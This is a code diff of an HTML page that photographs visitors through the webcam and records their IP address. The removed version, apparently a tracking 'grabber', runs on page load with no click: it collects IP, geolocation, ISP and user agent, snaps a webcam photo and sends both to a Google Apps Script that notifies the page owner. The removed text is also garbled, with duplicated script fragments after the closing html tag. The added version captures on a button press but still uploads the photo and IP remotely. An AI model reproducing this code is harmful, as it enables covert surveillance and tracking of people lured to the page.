@@ -1,111 +1,66 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
- <meta charset="UTF-8">
- <meta name="viewport" content="width=device-width, initial-scale=1.0">
- <base target="_top">
- <title>自動拍攝照片與記kkk錄 IP</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>照片上傳與記錄</title>
 </head>
 <body>
+  <h1>照片上傳與記錄</h1>
+  <p id="ipInfo">載入中...</p>
+  <button id="capturePhoto">拍攝照片並上傳</button>
+  <p id="status">尚未開始操作</p>
 
+  <script>
+    // 獲取 IP 資訊
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        document.getElementById('ipInfo').innerText = `IP: ${data.ip}`;
+        window.ipInfo = data.ip; // 保存 IP 信息
+      })
+      .catch(error => {
+        document.getElementById('ipInfo').innerText = '無法獲取 IP 資訊';
+        console.error(error);
+      });
 
- <h1>自動拍攝照片與記錄 IP 資訊</h1>
- <h2>IP 資訊</h2>
- <p id="ipInfo">載入中...</p>
+    // 拍攝照片並上傳
+    document.getElementById('capturePhoto').addEventListener('click', async () => {
+      const videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const videoTrack = videoStream.getVideoTracks()[0];
+      const imageCapture = new ImageCapture(videoTrack);
+      const photoBlob = await imageCapture.takePhoto();
 
+      const reader = new FileReader();
+      reader.onloadend = () => {
+        const base64Photo = reader.result; // 照片的 Base64 資料
 
- <script>
-   // 獲取 IP 和地理位置資訊
-   fetch('https://ipinfo.io/json')
-     .then(response => response.json())
-     .then(data => {
-       const { ip, city, region, country, org } = data;
-       const ipType = ip.includes('.') ? 'IPV4' : ip.includes(':') ? 'IPV6' : '無法讀取';
-       const userAgent = navigator.userAgent;
-
-
-       // 顯示 IP 資訊
-       document.getElementById('ipInfo').innerText =
-         `IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}`;
-
-
-       // 傳遞資料到 Google Apps Script
-       google.script.run.recordData(ip, ipType, userAgent, city, region, country, org);
-     })
-     .catch(error => {
-       console.error('Error fetching IP info:', error);
-       document.getElementById('ipInfo').innerText = '無法獲取 IP 資訊';
-     });
-
-
-   document.addEventListener('DOMContentLoaded', async () => {
-     // 啟用攝影機並立即拍攝
-     try {
-       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-       const photoBlob = await takePhoto(stream);
-
-
-       // 將拍攝的照片上傳到 Google Apps Script
-       const reader = new FileReader();
-       reader.onloadend = () => {
-         const base64data = reader.result; // 照片的 Base64 資料
-         google.script.run.uploadPhotoAndNotify(base64data);
-       };
-       reader.readAsDataURL(photoBlob);
-
-
-       // 關閉攝影機
-       stream.getTracks().forEach(track => track.stop());
-     } catch (error) {
-       console.error('拍攝或上傳照片時出錯:', error);
-     }
-   });
-
-
-   async function takePhoto(stream) {
-     const videoTrack = stream.getVideoTracks()[0];
-     const imageCapture = new ImageCapture(videoTrack);
-     return await imageCapture.takePhoto();
-   }
- </script>
-</body>
-</html>
-
-
-
-
-     async function takePhoto(stream) {
-       const videoTrack = stream.getVideoTracks()[0];
-       const imageCapture = new ImageCapture(videoTrack);
-
-
-       return await imageCapture.takePhoto();
-     }
-   });
-  
-
-
- </script>
-  <img id="image" src="" alt="">
-
-
-   <script>
-       // 將 blob URL 換成你的 URL
-       //const blobUrl = 'blob:https://n-auxprxm53jznu5lr2tpkpapvzdsuuqboqfsczca-0lu-script.googleusercontent.com/03f9f9e0-987a-4c31-900f-60d6a0b941e7';
-
-
-       /*fetch(blobUrl)
-           .then(response => response.blob())
-           .then(blob => {
-               const reader = new FileReader();
-               reader.onloadend = function() {
-                   const base64data = reader.result;
-                   document.getElementById('image').src = base64data;
-               }
-               reader.readAsDataURL(blob);
-           })
-           .catch(error => console.error('Error fetching blob image:', error));
-   </script>
-</body>
+        // 發送數據到 Google Apps Script
+        fetch('https://script.google.com/macros/s/AKfycbw.../exec', { // 替換為您的 Apps Script URL
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            ip: window.ipInfo,
+            photoDataUrl: base64Photo,
+            userAgent: navigator.userAgent,
+            city: '未知',
+            region: '未知',
+            country: '未知',
+            org: '未知',
+            ipType: 'IPV4',
+          }),
+        })
+          .then(res => res.json())
+          .then(data => {
+            document.getElementById('status').innerText = '上傳成功！照片 URL: ' + data.photoUrl;
+          })
+          .catch(error => {
+            document.getElementById('status').innerText = '上傳失敗，請檢查控制台日誌。';
+            console.error(error);
+          });
+      };
+      reader.readAsDataURL(photoBlob);
+    });
+  </script>
 </body>
 </html>
